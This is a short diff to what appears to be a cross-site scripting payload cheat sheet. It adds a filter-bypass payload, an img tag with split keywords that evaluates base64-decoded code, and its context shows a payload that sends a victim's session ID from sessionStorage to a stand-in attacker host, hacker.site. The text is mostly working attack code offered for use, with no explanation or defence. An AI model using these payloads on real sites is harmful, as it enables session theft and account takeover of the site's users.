@@ -8,6 +8,12 @@
 
 ```
 
+## Filter Bypass
+### Base64 into Eval
+```html
+<img src=x o<scriptnerror=javajavascript:script:eval(atob('%s'))>
+```
+
 ## Extract Session Data
 ```js
 new Image().src ="http://hacker.site/SID?"+escape(sessionStorage.getItem('sessionID'));
